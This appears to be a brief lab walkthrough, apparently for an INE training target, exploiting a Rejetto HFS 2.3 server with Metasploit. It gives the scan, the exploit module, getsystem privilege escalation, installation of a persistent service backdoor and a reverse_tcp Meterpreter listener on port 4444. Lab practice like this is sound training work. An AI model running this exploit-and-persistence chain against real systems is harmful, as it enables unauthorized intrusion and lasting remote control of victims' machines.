# Metasploit

### Exploit System

```
nmap -sV -sC -p- demo.ine.local
```

![1.1](./imgs/1.1.png)

```
searchsploit hfs 2.3
```

![1.2](./imgs/1.2.png)

Exploit the system
```
msfconsole
search rejetto
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS demo.ine.local
exploit
getsystem
```
![1.3](./imgs/1.3.png)

### Install Persistent Backdoor

Hacked machine will continually try to connect back to host at port 4444

```
background
search persistence
use exploit/windows/local/persistence_service
set SESSION 1
exploit
```
![2.1](./imgs/2.1.png)

### Test Backdoor

Delete all sessions
```
background
sessions -K
```

Connect to backdoor
```
use exploit/multi/handler
set LHOST 0.0.0.0
set PAYLOAD windows/meterpreter/reverse_tcp
```

![3.1](./imgs/3.1.png)

